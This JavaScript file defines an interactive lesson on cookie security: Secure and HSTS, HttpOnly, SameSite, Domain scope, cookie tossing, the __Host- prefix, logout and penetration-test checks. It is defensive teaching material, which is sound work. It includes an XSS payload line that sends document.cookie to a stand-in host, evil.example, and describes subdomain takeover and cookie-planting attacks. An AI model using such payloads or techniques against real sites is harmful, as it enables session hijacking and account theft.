(function () {
  const { block, device, db, card, link, both, flow, rt, red, green, amber, gray, note, bad, good, warn } = SD;

  const alice = (tags = [], o = {}) => device(0, -18, Object.assign({ label: "Alice", tags }, o));
  const client = (label, tags = [], o = {}) => device(0, -18, Object.assign({ label, tags }, o));
  const app = (tags = [], o = {}) => block(0, -2, Object.assign({ label: ["app", "example.com"], glyph: "store", tags }, o));
  const sessions = (tags = [], o = {}) => db(0, 12, Object.assign({ label: "sessions", glyph: "key", tags }, o));
  const wifi = (tags = []) => block(14, -8, { s: 3.6, h: 34, label: ["cafe", "Wi-Fi"], glyph: "wifi", color: "red", tags, pills: "below" });
  const evil = (tags = []) => block(-17, -8, { label: ["evil", "example"], glyph: "skull", color: "red", tags });
  const promo = (tags = []) => block(-17, -8, { label: ["promo", "subdomain"], glyph: "globe", color: "red", tags });
  const mallory = (tags = []) => device(15, 7, { label: "attacker", labelIcon: "skull", screen: "red", tags });
  const low = (dx = -100, dy = 100) => ({ x: 0, y: -2, dx, dy });
  const high = (dx = -420, dy = -200) => ({ x: 0, y: -2, dx, dy });

  const base = (label = "GET /account", o = {}, extra = {}, from = "alice") =>
    Object.assign(
      {
        aa: both(from, "app", Object.assign({ label, labelAt: 0.5, labelSide: "below" }, o)),
        ad: both("app", "db"),
      },
      extra
    );
  const exfil = (o = {}) => link("alice", "evil", Object.assign({ style: "dashed", tone: "red", labelTone: "red", labelAt: 0.62 }, o));
  const visit = (o = {}) => both("alice", "evil", Object.assign({ label: "opens a link", labelAt: 0.62 }, o));
  const toPromo = (label, o = {}) => both("alice", "promo", Object.assign({ label, labelAt: 0.62, labelTone: "red" }, o));

  SD.lesson({
    id: "cookie-security",
    covers: ["httponly-and-secure-cookies-interview-questions"],
    title: "Cookie Security: Secure, HttpOnly, SameSite and scope",
    summary: "What each cookie attribute really protects, why HttpOnly is neither an XSS nor a CSRF fix, and how a subdomain can read or overwrite your session cookie.",
    minutes: 14,
    level: "intermediate",
    metrics: [
      { id: "sent", label: "Cookie sent to", icon: "route" },
      { id: "reads", label: "Readable by", icon: "eye" },
      { id: "defense", label: "Defense", icon: "shield" },
    ],
    legend: [["mine", "Alice"], ["secret", "session cookie"], ["poison", "attacker"], ["res", "response"], ["empty", "no session"], ["ping", "test request"]],
    goals: [
      { text: "What Secure and HSTS each protect", step: 1 },
      { text: "What HttpOnly blocks", step: 2 },
      { text: "Why HttpOnly doesn't fix XSS or CSRF", step: 3 },
      { text: "Domain scope and subdomain takeover", step: 5 },
      { text: "Cookie tossing and the __Host- prefix", step: 7 },
      { text: "Testing cookies in a VAPT", step: 10 },
    ],
    steps: [
      {
        short: "Set-Cookie",
        chapter: "setup",
        title: "The browser stores the cookie and sends it back",
        body: [
          "Alice logs in to <code>app.example.com</code>. The response carries <code>Set-Cookie: sid=7f3a9c...; Path=/</code>, and her browser files it in its <span class=\"term\">cookie jar</span> under that host. From then on every request whose host and path match gets <code>Cookie: sid=7f3a9c...</code> added, whether a click, a <code>fetch()</code> or an image tag caused it.",
          "Two facts drive the rest of this lesson. The sid is a <span class=\"term\">bearer credential</span>: whoever presents it is Alice, as far as the server can tell. And the attributes after the value are instructions for the browser only. The <code>Cookie</code> header sends back name=value and nothing else, so the server never learns how a cookie was scoped or who set it.",
        ],
        callout: { kind: "insight", text: "Each attribute answers one question for the browser: when to send it (<code>Secure</code>, <code>SameSite</code>, <code>Domain</code>, <code>Path</code>), who may read it (<code>HttpOnly</code>), and how long to keep it (<code>Expires</code>, <code>Max-Age</code>)." },
        metrics: { sent: warn("http and https"), reads: warn("any page script"), defense: "-" },
        scene: {
          entities: {
            alice: alice([note("jar: sid=7f3a9c...", "cookie")]),
            app: app([note("issues sid on login", "logIn")]),
            db: sessions([note("7f3a9c -> alice", "key")]),
            card: card(low(), "Set once, sent back every time", ["POST /login   200 OK", "Set-Cookie: sid=7f3a9c...; Path=/", "GET /account", "Cookie: sid=7f3a9c...", "! only name=value comes back", "# no Secure, no HttpOnly yet"], { icon: "cookie" }),
          },
          links: base("POST /login"),
          flows: [rt(["aa", "ad"], "mine", { rate: 0.7 }), flow("aa", "secret", { rate: 0.5, reverse: true, delay: 1.2 })],
        },
      },
      {
        short: "No Secure",
        chapter: "attack",
        title: "No Secure flag: one http request leaks the session",
        body: [
          "Alice is on cafe Wi-Fi and clicks an old <code>http://app.example.com</code> link in an email. Her sid has no <code>Secure</code> flag, so the browser attaches it to that plain-http request, and it crosses the network in clear text before the server's <code>301</code> to https comes back. Firesheep turned this into a one-click session grab for Facebook and Twitter in 2010. Alice doesn't even need to click: the attacker can inject <code>&lt;img src=\"http://app.example.com/x\"&gt;</code> into any http page she loads.",
          "<code>Secure</code> fixes the cookie side: the browser never puts it on an http request, forced or not. <span class=\"term\">HSTS</span> fixes the request side: after <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>, the browser rewrites http to https itself, which also stops sslstrip-style downgrades. But HSTS is learned from a response, so the first visit on a new device stays exposed unless the domain is on the browser preload list.",
        ],
        callout: { kind: "warn", text: "Secure doesn't encrypt anything. It only decides when the browser may send the cookie; TLS does the protecting, and the value still sits in plain text on disk and in DevTools." },
        changes: ["- sid sent on an http:// request", "- Copied off the cafe network", "+ Fix: Secure flag plus HSTS"],
        metrics: { sent: bad("plain http too"), reads: bad("anyone on the Wi-Fi"), defense: bad("no Secure flag") },
        scene: {
          entities: {
            alice: alice([red("clicks an http:// link", "link")]),
            wifi: wifi([red("copies sid, replays it", "eye")]),
            app: app([amber("301 to https, too late", "route")]),
            db: sessions([red("7f3a9c used from 2 IPs", "key")]),
            card: card(high(), "The first request", ["GET http://app.example.com/ HTTP/1.1", "Cookie: sid=7f3a9c...", "! clear text on the cafe network", "301 Location: https://app.example.com/", "= Secure: never sent over http", "= HSTS: browser skips http entirely"], { icon: "wifi" }),
          },
          links: {
            aw: both("alice", "wifi", { label: "http:// + Cookie: sid", labelAt: 0.5, labelSide: "below", labelTone: "red" }),
            wa: both("wifi", "app"),
            ad: both("app", "db"),
          },
          flows: [flow(["aw", "wa"], "mine", { rate: 0.6 }), flow("aw", "secret", { rate: 0.6, delay: 0.3 }), flow(["wa", "ad"], "poison", { rate: 0.5, delay: 1.2 })],
        },
      },
      {
        short: "HttpOnly",
        chapter: "solution",
        title: "HttpOnly: page scripts can't read the cookie",
        body: [
          "With <code>Set-Cookie: sid=7f3a9c...; Secure; HttpOnly</code>, the browser still sends the cookie on every matching request but leaves it out of <code>document.cookie</code> and the Cookie Store API. Now say the app has an XSS bug and the payload runs <code>new Image().src = '//evil.example/c?' + document.cookie</code>. The request still fires, carrying <code>theme=dark</code> and no session.",
          "That matters because a stolen cookie is portable. On the attacker's laptop it works from anywhere, keeps working after Alice closes the tab, and lasts as long as the server lets the session live. With HttpOnly the attacker has to act through Alice's open browser, which is slower, noisier, and over when she leaves.",
        ],
        callout: { kind: "tip", text: "Set HttpOnly on anything the server reads and page JavaScript doesn't: session ids, remember-me and refresh tokens. A double-submit CSRF cookie is the usual exception, because script has to copy it into a header." },
        changes: ["+ HttpOnly on the session cookie", "~ document.cookie no longer shows sid", "~ XSS payload sends nothing useful"],
        metrics: { sent: good("https only"), reads: good("not page JS"), defense: good("Secure + HttpOnly") },
        scene: {
          entities: {
            alice: alice([amber("XSS reads document.cookie", "code")], { screen: "red" }),
            app: app([green("sid set HttpOnly", "cookie")]),
            db: sessions([note("7f3a9c -> alice", "key")]),
            evil: evil([gray("no session in it", "eyeOff")]),
            card: card(low(), "What the payload sees", ["Set-Cookie: sid=7f3a9c...; Secure; HttpOnly", "> document.cookie", "'theme=dark'", "= sid hidden from JS and cookieStore", "= nothing to copy to another machine", "# the user still sees it in DevTools"], { icon: "eyeOff" }),
          },
          links: base("GET /account", {}, { ae: exfil({ label: "?c=theme=dark" }) }),
          flows: [rt(["aa", "ad"], "mine", { rate: 0.7 }), flow("ae", "empty", { rate: 0.6, delay: 0.6 })],
        },
      },
      {
        short: "HttpOnly limits",
        chapter: "problem",
        title: "HttpOnly doesn't fix XSS or stop CSRF",
        body: [
          "The script can't read <code>sid</code>, but it rarely needs to. It runs inside Alice's tab, so <code>fetch('/api/email', {method: 'POST'})</code> goes out with her cookie attached, exactly as the XSS lesson showed. And some pages hand the value straight back: a forgotten <code>/phpinfo.php</code> that prints <code>HTTP_COOKIE</code>, a debug endpoint that echoes request headers, or the old <code>TRACE</code> method behind Cross-Site Tracing (XST) in 2003.",
          "It does nothing for CSRF either. A forged form on <code>evil.example</code> never touches the cookie; Alice's browser attaches it on its own, HttpOnly or not. The flag answers one question, \"can page JavaScript read this?\", and whether the cookie is sent at all is decided by the attribute in the next step.",
        ],
        callout: { kind: "warn", text: "Interview trap: \"we set HttpOnly, so XSS and CSRF are handled.\" Wrong on both counts. It stops cookie theft through JavaScript; XSS still needs encoding and CSP, and CSRF still needs SameSite and tokens." },
        changes: ["- Script still calls APIs as Alice", "- phpinfo() echoes the Cookie header", "- Forged forms still carry the cookie"],
        metrics: { sent: good("https only"), reads: bad("a header-echo page"), defense: warn("HttpOnly alone") },
        scene: {
          entities: {
            alice: alice([red("script runs in her tab", "code")], { screen: "red" }),
            app: app([red("prints HTTP_COOKIE", "fileCode")]),
            db: sessions([note("7f3a9c -> alice", "key")]),
            evil: evil([red("gets sid anyway", "download")]),
            card: card(low(), "Still works with HttpOnly", ["! fetch('/api/email') rides the session", "! /phpinfo.php prints HTTP_COOKIE", "! TRACE echoed headers (XST, 2003)", "! flood the jar, evict sid, set your own", "! a cross-site form still sends it", "# HttpOnly: JS can't read it. That's all."], { icon: "alert" }),
          },
          links: base("fetch('/phpinfo.php')", { labelTone: "red" }, { ae: exfil({ label: "response, sid included" }) }),
          flows: [rt("aa", "poison", { rate: 0.6, back: "secret" }), flow("ae", "secret", { rate: 0.6, delay: 1.4 })],
        },
      },
      {
        short: "SameSite",
        chapter: "insight",
        title: "SameSite decides whether it's sent cross-site",
        body: [
          "Sending is controlled by <code>SameSite</code>, which the CSRF lesson covers in depth. <code>Lax</code> holds the cookie back on cross-site POSTs, iframes and image loads but sends it when Alice follows a link, <code>Strict</code> holds it back on links too, and <code>None</code> always sends it and must be paired with <code>Secure</code>. Chromium treats a cookie with no SameSite as Lax, but not every browser does, so set it explicitly.",
          "It still isn't the whole CSRF answer. Lax sends the cookie on top-level GET navigations, so any GET that changes state stays exposed. And \"site\" means registrable domain: <code>promo.example.com</code> is same-site with <code>app.example.com</code>, so a form there gets the cookie. Keep CSRF tokens or Origin checks alongside it.",
        ],
        callout: { kind: "tip", text: "Chrome's Lax default has a grace period: a cookie set without SameSite in the last two minutes is still sent on cross-site top-level POSTs, so some SSO flows keep working. One more reason to set the attribute yourself." },
        changes: ["+ SameSite=Lax on the session cookie", "~ Cross-site POST arrives without sid", "- Same-site subdomains still get it"],
        metrics: { sent: good("same-site only"), reads: good("not page JS"), defense: good("SameSite=Lax") },
        scene: {
          entities: {
            alice: alice([green("Lax: sid held back", "cookie")]),
            app: app([green("no session: 401", "shieldCheck")]),
            db: sessions([note("7f3a9c -> alice", "key")]),
            evil: evil([red("auto-submitting form", "code")]),
            card: card(low(-110), "Three different questions", ["Secure    sent over http?       no", "HttpOnly  readable by page JS?  no", "SameSite  sent cross-site?      Lax: no POST", "! HttpOnly says nothing about CSRF", "! same-site includes *.example.com"], { icon: "cookie" }),
          },
          links: base("POST /account/email, no sid", { labelTone: "red" }, { ae: visit() }),
          flows: [rt("ae", "mine", { rate: 0.5, back: "poison" }), flow("aa", "poison", { rate: 0.6, delay: 1, blocked: true })],
        },
      },
      {
        short: "Domain scope",
        chapter: "attack",
        title: "Domain=example.com hands the cookie to every subdomain",
        body: [
          "To share the login between <code>www</code> and <code>app</code>, someone sets <code>Domain=example.com</code>. That means \"this domain and every subdomain\": promo, blog, status, the forgotten staging box. Leaving Domain off is the narrow choice, a <span class=\"term\">host-only</span> cookie that only <code>app.example.com</code> receives, which surprises a lot of people.",
          "Now <code>promo.example.com</code> still has a CNAME to a deleted Heroku app, and the attacker registers that app name: a <span class=\"term\">subdomain takeover</span>. Any request Alice's browser makes to promo, from a link she follows or an image on another example.com page, carries her sid, and the attacker reads it in the server logs. HttpOnly and Secure can't help, because the attacker isn't using JavaScript or sniffing the network; they run the server the cookie is sent to.",
        ],
        callout: { kind: "insight", text: "Browsers check the Public Suffix List and refuse <code>Domain=com</code> or <code>Domain=github.io</code>, so one github.io site can't set cookies for all the others. Your own parent domain gets no such protection." },
        changes: ["- Domain=example.com on the session", "- promo.example.com taken over", "- sid lands in the attacker's logs"],
        metrics: { sent: bad("every *.example.com"), reads: bad("promo's server"), defense: bad("Domain too broad") },
        scene: {
          entities: {
            alice: alice([amber("sid for *.example.com", "cookie")]),
            app: app([amber("sets Domain=example.com", "globe")]),
            db: sessions([note("7f3a9c -> alice", "key")]),
            promo: promo([red("logs every Cookie header", "eye")]),
            card: card(low(-110), "Who gets the cookie", ["Set-Cookie: sid=7f3a...; Domain=example.com", "= app.example.com", "! promo.example.com  CNAME -> deleted app", "! blog, status, staging: every subdomain", "= no Domain attribute: host-only", "# .example.com means the same thing"], { icon: "globe" }),
          },
          links: base("GET /account", {}, { ap: toPromo("GET promo + Cookie: sid") }),
          flows: [rt(["aa", "ad"], "mine", { rate: 0.6 }), flow("ap", "secret", { rate: 0.6, delay: 0.8 })],
        },
      },
      {
        short: "Cookie tossing",
        chapter: "attack",
        title: "Cookie tossing: a subdomain writes cookies for you",
        body: [
          "Even if your cookie is host-only, any subdomain can <b>set</b> one for the parent. Promo answers with <code>Set-Cookie: sid=MAL; Domain=example.com; Path=/account</code>, and Alice's browser now sends two cookies to <code>/account</code>: <code>Cookie: sid=MAL; sid=7f3a...</code>. Browsers list longer paths first, so on a server that reads the first value, Alice is working inside the attacker's account and her saved card lands there.",
          "The server can't tell the two apart, since only name=value comes back. The same move plants a known CSRF cookie to defeat a naive double-submit check. It also shows what Path is really for: it decides which cookies are sent and in what order, and RFC 6265 warns against relying on it for isolation, since a script on <code>/blog</code> can read a <code>/admin</code> cookie through a same-origin iframe.",
        ],
        callout: { kind: "insight", text: "GitHub moved user Pages from <code>github.com</code> subdomains to <code>github.io</code> in 2013 partly for this reason: any user's page could toss cookies at github.com itself." },
        changes: ["- promo sets sid for example.com", "- Two sid cookies, attacker's first", "~ Path changes order, not access"],
        metrics: { sent: bad("both sids, MAL first"), reads: warn("server can't tell"), defense: bad("plain name: sid") },
        scene: {
          entities: {
            alice: alice([amber("jar: 2 cookies named sid", "cookie")]),
            app: app([red("reads the first sid", "userX")]),
            db: sessions([red("alice's card saved to MAL", "creditCard")]),
            promo: promo([red("MAL = mallory's session", "key")]),
            card: card(low(-110), "Two cookies, one name", ["promo.example.com responds:", "Set-Cookie: sid=MAL; Domain=example.com;", "            Path=/account", "! Cookie: sid=MAL; sid=7f3a...", "! the longer path is listed first", "# Path orders cookies; it doesn't isolate"], { icon: "cookie" }),
          },
          links: base("Cookie: sid=MAL; sid=7f3a", { labelTone: "red" }, { ap: toPromo("Set-Cookie: sid=MAL") }),
          flows: [rt("ap", "mine", { rate: 0.5, back: "poison" }), flow(["aa", "ad"], "poison", { rate: 0.5, delay: 1.2 })],
        },
      },
      {
        short: "__Host- prefix",
        chapter: "solution",
        title: "__Host- and __Secure-: rules the browser enforces",
        body: [
          "Name the cookie <code>__Host-sid</code> and the browser stores it only if it has <code>Secure</code>, arrived over https, has <code>Path=/</code> and has <b>no</b> Domain attribute. That makes it host-only by construction. Promo can't plant a <code>__Host-sid</code> that the app would receive, because that needs Domain, and the app ignores any plain <code>sid</code> it gets.",
          "<code>__Secure-</code> is the weaker sibling: it only requires Secure and https, so it still allows Domain for cookies that really must span subdomains. Both rules are checked by the browser when the cookie is stored, which is why a server that can't see attributes can still trust the name. The session cookie to aim for: <code>__Host-sid=7f3a...; Secure; HttpOnly; SameSite=Lax; Path=/</code>.",
        ],
        callout: { kind: "tip", text: "__Host- answers both subdomain problems at once: a sibling can't receive the cookie and can't plant one. It does nothing about XSS on the app host itself." },
        changes: ["+ Session renamed to __Host-sid", "~ Planted cookie dropped by the browser", "+ App ignores a plain sid"],
        metrics: { sent: good("app.example.com only"), reads: good("server only"), defense: good("__Host- prefix") },
        scene: {
          entities: {
            alice: alice([green("drops the planted cookie", "ban")]),
            app: app([green("reads __Host-sid only", "shieldCheck")]),
            db: sessions([green("7f3a9c -> alice", "key")]),
            promo: promo([red("tries Domain=example.com", "upload")]),
            card: card(low(-110), "Prefix rules", ["__Host-sid=7f3a...; Secure; HttpOnly;", "    SameSite=Lax; Path=/", "= Secure, and set over https", "= Path=/ and no Domain: host-only", "! promo's __Host-sid with Domain: dropped", "# __Secure-: only Secure + https"], { icon: "shieldCheck" }),
          },
          links: base("Cookie: __Host-sid=7f3a", {}, { ap: toPromo("Set-Cookie: __Host-sid=MAL", { fail: 0.45, labelAt: 0.74 }) }),
          flows: [flow("ap", "poison", { rate: 0.5, reverse: true }), rt(["aa", "ad"], "mine", { rate: 0.6, delay: 0.8 })],
        },
      },
      {
        short: "Lifetime",
        chapter: "technique",
        title: "How long it lives, and what logout must clear",
        body: [
          "A cookie with no <code>Expires</code> or <code>Max-Age</code> is a <span class=\"term\">session cookie</span>, dropped when the browser session ends, though session restore in Chrome and Firefox can keep it alive for weeks. <code>Max-Age=1209600</code> makes it persistent for 14 days and wins if <code>Expires</code> is also set. Either way it's a hint to Alice's browser, and a copy on the attacker's laptop ignores it.",
          "So expiry and logout have to happen on the server. Logout deletes the session record, then sends <code>Set-Cookie: __Host-sid=; Max-Age=0; Path=/; Secure</code> with the same name, Domain and Path so it replaces the right cookie, and <code>Clear-Site-Data: \"cookies\"</code> can sweep the rest. Add an idle timeout and an absolute one, and end all sessions on a password change.",
        ],
        callout: { kind: "tip", text: "Remember-me is a separate long-lived token, stored hashed on the server and rotated on every use. Don't stretch the session cookie to a one-year <code>Max-Age</code> instead." },
        changes: ["+ Logout deletes the session row", "+ Max-Age=0 with matching Path", "~ Copied sid now gets a 401"],
        metrics: { sent: good("until Max-Age=0"), reads: good("server only"), defense: good("server-side expiry") },
        scene: {
          entities: {
            alice: alice([note("clicks Log out", "logIn")]),
            app: app([green("deletes session 7f3a9c", "shieldCheck")]),
            db: sessions([green("7f3a9c: gone", "key")]),
            mallory: mallory([red("copied sid last week", "cookie")]),
            card: card(low(-110), "Lifetime and logout", ["no Expires/Max-Age   session cookie", "Max-Age=1209600      14 days, beats Expires", "! expiry is only a hint to the browser", "POST /logout", "= DELETE the server-side session", "= Set-Cookie: __Host-sid=; Max-Age=0; Path=/"], { icon: "timer" }),
          },
          links: base("POST /logout", {}, { ma: link("mallory", "app", { label: "old sid: 401", labelTone: "red", tone: "red", fail: 0.8, labelAt: 0.45 }) }),
          flows: [rt(["aa", "ad"], "mine", { rate: 0.6 }), flow("ma", "poison", { rate: 0.5, delay: 1 })],
        },
      },
      {
        short: "Cookie contents",
        chapter: "problem",
        title: "Keep data out of the cookie; store an id",
        body: [
          "Some apps keep state in the cookie itself: <code>user=1042; role=user</code>, or base64 JSON such as <code>eyJyb2xlIjoidXNlciJ9</code>. But a cookie is user input. Mallory opens DevTools, changes <code>role=user</code> to <code>role=admin</code>, reloads, and the admin panel believes her. Base64 hides nothing, and whoever copies the cookie reads everything in it.",
          "The default answer is a random id, say 128 bits from a CSPRNG, with every fact about the user kept in the server-side session. If state must live client-side, sign it with an HMAC so edits are rejected, and encrypt it as well if the contents are private. Flask's default session cookie is signed but not encrypted, so anyone can decode it, and a leaked <code>SECRET_KEY</code> lets an attacker forge one with a tool like flask-unsign.",
        ],
        callout: { kind: "insight", text: "Signed or encrypted cookies can't be revoked before they expire, because the server keeps no record to delete. That's the same trade-off you saw with JWTs." },
        changes: ["- role read straight from the cookie", "- Base64 JSON decoded and edited", "+ Random id, state on the server"],
        metrics: { sent: "app.example.com", reads: bad("the user, in DevTools"), defense: bad("trusts cookie data") },
        scene: {
          entities: {
            client: client("mallory", [red("edits role=user to admin", "pen")], { labelIcon: "skull", screen: "red" }),
            app: app([red("trusts it: admin panel", "unlock")]),
            db: sessions([gray("never consulted", "eyeOff")], { dim: 0.5 }),
            card: card(low(), "What's in the cookie", ["Cookie: user=1042; role=admin", "! edited in DevTools, never checked", "! eyJyb2xlIjoidXNlciJ9 = {\"role\":\"user\"}", "= sid=7f3a9c... -> state on the server", "= client-side state: sign it (HMAC)", "=   and encrypt it if it's private"], { icon: "cookie" }),
          },
          links: base("Cookie: role=admin", { labelTone: "red" }, {}, "client"),
          flows: [rt("aa", "poison", { rate: 0.6 })],
        },
      },
      {
        short: "VAPT checks",
        chapter: "technique",
        title: "Testing cookies in a VAPT",
        body: [
          "Proxy the app through Burp and collect every <code>Set-Cookie</code> from login, refresh, logout and password reset. For each cookie note Secure, HttpOnly, SameSite, Domain, Path and lifetime, then work out which ones actually grant access. Request an <code>http://</code> URL to see whether the session goes out in clear and whether HSTS is set, run <code>document.cookie</code> in the console, and decode and edit every value.",
          "Two tests find most of the real bugs. Log out, then replay the old session cookie in Repeater: a <code>200</code> means logout only cleared the browser. If anything sets Domain, enumerate subdomains (crt.sh, subfinder) and look for dangling CNAMEs. Report impact, not flags: a session cookie without Secure on a site with no HSTS is a finding, while a missing HttpOnly on an analytics cookie is informational.",
        ],
        callout: { kind: "tip", text: "Burp Sequencer estimates the randomness of session ids from a few thousand samples. Run it before you call an id unguessable, especially on home-grown session code." },
        changes: ["+ Every Set-Cookie mapped and graded", "- Old sid still works after logout", "~ Flags reported by impact"],
        metrics: { sent: good("https only: pass"), reads: good("HttpOnly: pass"), defense: bad("logout: fail") },
        scene: {
          entities: {
            client: client("tester", [note("Repeater: sid after logout", "refresh")], { labelIcon: "search", screen: "blue" }),
            app: app([red("200 OK, still logged in", "alert")]),
            db: sessions([red("row never deleted", "key")]),
            card: card(low(-110), "Cookie test sheet", ["= sid: Secure, HttpOnly, SameSite=Lax", "! remember: no Secure, Max-Age 1 year", "= http:// request: no sid, HSTS set", "! logout, replay old sid: 200 OK", "# Domain set? check *.example.com CNAMEs", "# Sequencer on sid: effective entropy"], { icon: "listChecks" }),
          },
          links: base("GET /account, old sid", {}, {}, "client"),
          flows: [rt(["aa", "ad"], "ping", { rate: 0.8 })],
        },
      },
      {
        short: "Recap",
        chapter: "recap",
        title: "Recap: what each attribute does and doesn't do",
        body: [
          `<table class="compare">
            <thead><tr><th>Control</th><th>What it does</th><th>What it doesn't do</th></tr></thead>
            <tbody>
              <tr><td>Secure + HSTS</td><td>Cookie never rides plain http</td><td>Encrypt the value</td></tr>
              <tr><td>HttpOnly</td><td>Hides it from page JavaScript</td><td>Stop XSS acting as the user, or CSRF</td></tr>
              <tr><td>SameSite=Lax</td><td>Holds it back on cross-site POSTs</td><td>Cover state-changing GETs or subdomains</td></tr>
              <tr><td>No Domain</td><td>Host-only scope</td><td>Stop a subdomain planting cookies</td></tr>
              <tr><td>__Host- prefix</td><td>Forces Secure, Path=/, no Domain</td><td>Help against XSS on the host</td></tr>
              <tr><td>Server-side session</td><td>Real logout and expiry, nothing to edit</td><td>Replace any of the flags above</td></tr>
            </tbody>
          </table>`,
          "Interview shortcut: Secure decides the scheme, SameSite decides cross-site sending, HttpOnly decides whether JavaScript can read it, and none of them stop XSS from acting as the user. Scope the session host-only with <code>__Host-</code>, keep nothing but a random id in it, and make logout delete the session on the server.",
        ],
        callout: { kind: "next", text: "Next: <b>Session fixation and hijacking</b>. What an attacker does once they hold, or manage to plant, a session id, and why the id has to change at login." },
        metrics: { sent: good("app host, https"), reads: good("server only"), defense: good("layered") },
        scene: {
          entities: {
            alice: alice([green("__Host-sid: Secure, HttpOnly", "shieldCheck")]),
            app: app([green("SameSite=Lax, server expiry", "shieldCheck")]),
            db: sessions([green("random id -> state", "key")]),
          },
          links: base("GET /account"),
          flows: [rt(["aa", "ad"], "mine", { rate: 0.8 })],
        },
      },
    ],
  });
})();
